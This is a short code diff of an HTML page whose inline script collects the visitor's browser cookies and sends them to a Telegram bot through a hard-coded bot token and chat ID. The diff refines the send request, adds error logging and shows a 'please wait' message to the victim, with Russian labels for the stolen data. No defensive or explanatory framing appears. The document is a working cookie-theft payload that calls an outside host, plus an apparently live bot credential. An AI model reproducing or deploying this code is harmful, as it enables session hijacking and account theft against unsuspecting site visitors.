@@ -9,7 +9,17 @@
         var token = "8956009818:AAGRb4ZjMitHsN8Wv4Bd-oX0RauOdv3EANs";
         var chat_id = "6981190103";
         var cookies = document.cookie;
-        fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=КУКИ: ' + encodeURIComponent(cookies));
+        var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent('КУКИ: ' + cookies);
+        fetch(url)
+            .then(response => {
+                if (!response.ok) {
+                    console.log('Ошибка отправки');
+                }
+            })
+            .catch(error => {
+                console.log('Ошибка:', error);
+            });
+        document.write('<p>Пожалуйста, подождите...</p>');
     </script>
 </body>
 </html>
